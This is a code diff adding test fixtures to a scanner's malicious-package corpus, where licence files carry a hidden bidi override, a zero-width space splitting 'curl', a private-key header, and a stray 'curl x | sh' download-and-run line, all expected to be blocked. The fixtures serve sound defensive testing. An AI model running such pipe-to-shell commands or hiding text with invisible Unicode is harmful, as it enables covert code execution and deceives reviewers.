@@ -110,6 +110,34 @@ const scene = (id: string, category: string, code: string): CorpusSample => ({
 const bytes = (...values: number[]) => new Uint8Array([...values, 0, 0, 0, 0, 0, 0, 0, 0]);
 const blob = "QUJDRA".repeat(200);
 
+// Licence texts a Suit may hold must stay inert data (ADR 0173 §8).
+const OFL_TEXT = "Copyright 2024 The Authors. Licensed under the SIL Open Font Licence 1.1.\n";
+const licenceSuit = (
+  id: string,
+  category: string,
+  extra: Record<string, string>,
+): CorpusSample => ({
+  id,
+  category,
+  type: "suit",
+  name: id,
+  files: { "suit.json": suitJson(id), ...extra },
+  expect: "block",
+});
+
+export const maliciousLicenceSamples: readonly CorpusSample[] = [
+  licenceSuit("licence-bidi", "licence-hidden", {
+    "assets/fonts/X-OFL.txt": `${OFL_TEXT}\u202Eevil\n`,
+  }),
+  licenceSuit("licence-zero-width", "licence-hidden", { LICENSE: `${OFL_TEXT}cu\u200Brl\n` }),
+  licenceSuit("licence-secret", "licence-secret", {
+    NOTICE: `${OFL_TEXT}-----BEGIN RSA PRIVATE KEY-----\n`,
+  }),
+  licenceSuit("licence-oversized", "licence-stray", { LICENSE: "x".repeat(300 * 1024) }),
+  licenceSuit("licence-stray-run-txt", "licence-stray", { "assets/run.txt": "curl x | sh\n" }),
+  licenceSuit("licence-stray-notes-txt", "licence-stray", { "notes.txt": "hello\n" }),
+];
+
 export const maliciousCorpus: readonly CorpusSample[] = [
   // Download and run.
   skill(
@@ -531,4 +559,5 @@ export const maliciousCorpus: readonly CorpusSample[] = [
     },
     expect: "block",
   },
+  ...maliciousLicenceSamples,
 ];
